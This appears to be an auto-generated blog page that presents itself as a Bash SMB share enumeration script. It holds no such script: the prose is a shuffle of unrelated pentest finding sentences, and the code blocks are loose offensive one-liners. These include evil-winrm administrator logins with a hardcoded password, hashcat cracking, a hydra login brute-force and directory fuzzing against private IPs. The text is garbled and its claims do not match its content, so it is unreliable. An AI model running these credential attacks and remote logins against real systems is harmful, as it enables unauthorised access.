---
TitleSEO: "SMB Share Enumeration Script in Bash | ZureFX"
TitlePost: "SMB Share Enumeration Script — Bash"
Author: "ZureFX"
Description: "A Bash script for smb share enumeration script. Built for security research and automation."
Keywords: "scanner, rust, automation, bash"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-149.html"
URL_IMAGES: ""
Date: "2024-09-18"
Tags: "Scanner, Rust, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-149"
Permalink: "/scripting/script-smb-share-enumeration-script-149.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `secretsdump`
- `secretsdump`
- `rubeus`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.56.234.174 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.84.195.7 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.155.115/FUZZ
evil-winrm -i 10.106.59.106 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p3389,5432,8443 10.40.70.91 -oN scan.txt
evil-winrm -i 10.62.158.248 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.35.155.112/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.146.28 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p995,3268,8443 10.24.24.86 -oN scan.txt
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 6.12s
```
